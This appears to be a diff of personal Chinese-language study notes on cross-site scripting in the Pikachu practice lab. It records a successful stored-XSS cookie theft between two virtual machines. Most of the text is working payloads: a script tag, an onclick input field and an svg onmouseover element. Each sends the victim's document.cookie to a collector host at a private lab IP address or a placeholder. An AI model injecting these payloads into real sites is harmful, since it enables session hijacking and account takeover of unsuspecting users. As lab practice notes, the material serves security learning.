@@ -11,6 +11,7 @@ javascript:alert(1)
 在存储型pikachu页面尝试了获取cookie的方法，用两台虚拟机交互，最终成功获取cookie
 <script>document.location='http://ip地址/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>
 鼠标点击事件触发
-<input type="text" onclick="document.location='http://192.168.244.135/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie">
+<input type="text" onclick="document.location='http://192.168.244.135/pikachu/pkxss/xcookie/cookie.php?cookie='
++document.cookie">
 鼠标滑过触发
 <svg onmouseover="document.location='http://192.168.244.135/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie">
